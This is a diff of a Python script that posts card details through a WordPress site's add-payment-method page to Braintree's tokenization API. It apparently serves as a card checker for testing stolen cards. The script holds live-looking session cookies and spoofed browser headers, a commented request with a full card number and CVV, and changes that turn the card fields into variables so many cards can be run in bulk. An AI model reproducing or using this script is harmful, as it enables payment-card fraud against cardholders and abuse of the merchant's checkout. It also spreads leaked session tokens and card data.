@@ -30,26 +30,29 @@ hakemyeyyeyd%7C1718998649%7C2z2UsNAtn5cIk8ROLqm5ePQubiDLOFiRKZf5uXLL9zY%7Cc9dff9
 	with open('fileb3.txt', 'w') as file:
 		file.write(big)
 	cookies = {
-	    '_ga': 'GA1.1.774315979.1711878714',
-	    '_gcl_au': '1.1.169795609.1711878714',
+	    '_ga': 'GA1.1.1780262708.1717177773',
+	    '_gcl_au': '1.1.1201662495.1717177773',
 	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
-	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
-	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878997.57.0.0',
+	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '5259%7Cother%7Cread%7Cbb9d6eeff02165187d4781e9c5bcf91f9ee79e14f125503e2adc2c34863d304e',
+	    '_ga_J890L8ECJX': 'GS1.1.1717779434.3.1.1717779618.60.0.0',
 	}
 	
 	headers = {
 	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
+	    'Accept-Language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+	    'Cache-Control': 'max-age=0',
 	    'Connection': 'keep-alive',
-	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878997.57.0.0',
-	    'Referer': 'https://www.huntingtonacademy.com/my-account/payment-methods/',
+	    'Content-Type': 'application/x-www-form-urlencoded',
+	    # 'Cookie': '_ga=GA1.1.1780262708.1717177773; _gcl_au=1.1.1201662495.1717177773; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=ididudud%7C1718387387%7CL8tz3iA1bxEqTxCNi3dh0CbrzjUQqW7zi2NvMAtmFP3%7Cd11ff6c87613d2e4c909e30b81ac62ec8e964cdb049019377b57379e0b9fa6ab; wfwaf-authcookie-8288059899a58842f2727962646eba72=5259%7Cother%7Cread%7Cbb9d6eeff02165187d4781e9c5bcf91f9ee79e14f125503e2adc2c34863d304e; _ga_J890L8ECJX=GS1.1.1717779434.3.1.1717779618.60.0.0',
+	    'Origin': 'https://www.huntingtonacademy.com',
+	    'Referer': 'https://www.huntingtonacademy.com/my-account/add-payment-method/',
 	    'Sec-Fetch-Dest': 'document',
 	    'Sec-Fetch-Mode': 'navigate',
 	    'Sec-Fetch-Site': 'same-origin',
 	    'Sec-Fetch-User': '?1',
 	    'Upgrade-Insecure-Requests': '1',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
 	}
@@ -88,9 +91,9 @@ hakemyeyyeyd%7C1718998649%7C2z2UsNAtn5cIk8ROLqm5ePQubiDLOFiRKZf5uXLL9zY%7Cc9dff9
 	        'input': {
 	            'creditCard': {
 	                'number': n,
-	                'expirationMonth': m,
+	                'expirationMonth': mm,
 	                'expirationYear': yy,
-	                'cvv': 'cvc',
+	                'cvv': cvc,
 	                'billingAddress': {
 	                    'postalCode': '10090',
 	                    'streetAddress': 'New york',
@@ -109,10 +112,7 @@ hakemyeyyeyd%7C1718998649%7C2z2UsNAtn5cIk8ROLqm5ePQubiDLOFiRKZf5uXLL9zY%7Cc9dff9
 	# Note: json_data will not be serialized by requests
 	# exactly as it was in the original request.
 	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"29757419-f32f-4176-811a-6921404ff594"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4020870000579031","expirationMonth":"06","expirationYear":"2025","cvv":"601","billingAddress":{"postalCode":"10090","streetAddress":"New york"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
-	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
-	
-	import requests
-	
+	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)	
 	cookies = {
 	    '_ga': 'GA1.1.1780262708.1717177773',
 	    '_gcl_au': '1.1.1201662495.1717177773',
